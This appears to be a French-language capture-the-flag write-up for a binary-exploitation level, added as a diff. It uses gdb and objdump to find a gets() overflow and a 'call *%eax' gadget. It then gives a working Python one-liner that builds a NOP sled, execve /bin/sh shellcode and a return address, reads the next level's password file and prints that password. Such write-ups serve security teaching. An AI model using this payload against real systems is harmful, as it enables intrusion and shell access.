@@ -1,0 +1,33 @@
+on commence par gdb.
+
+gdb level2
+diasssemble main
+
+on peut voir qu une fonction "p" est appelée, allons voir ca de plus pres.
+on remarque:
+   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
+
+Helas il y a une comparaison avec un masque binaire sur 0xb0000000 (canary).
+Du fait que l'on ne peut pas appeler directement system pour spawn un shell, on va
+utiliser une maniere détourneée: un "call eax", donc se debrouiller pour avoir notre shellcode
+dans un retour de fonction C qui appeler eax qui contiendra le shellcode.
+
+Voyons ou se trouve cet appel:
+objdump -d level2 | grep call
+ 80485eb:	ff d0                	call   *%eax
+
+on dois faire attention a ne pas depasser 64 pour le buffer du shellcode car
+0x4c - 0xc = 64 ensuite on remplis l'adresse jusqu'a l'overflow
+
+on recupere un shellcode ici:
+https://dhavalkapil.com/blogs/Shellcode-Injection/
+
+notre shellcode fait 25 de long, le buffer fait 64, il reste donc 39 octects a
+remplire par des \x90 (instruction nop), dans l'overflow on colle l'addresse
+du debut de notre buffer (les \x90).
+
+python -c 'print "\x90"*39+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x08\x04\x85\xeb"[::-1]*6' > /tmp/xploit
+cat /tmp/xploit - | ./level2
+cat /home/user/level3/.pass
+
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
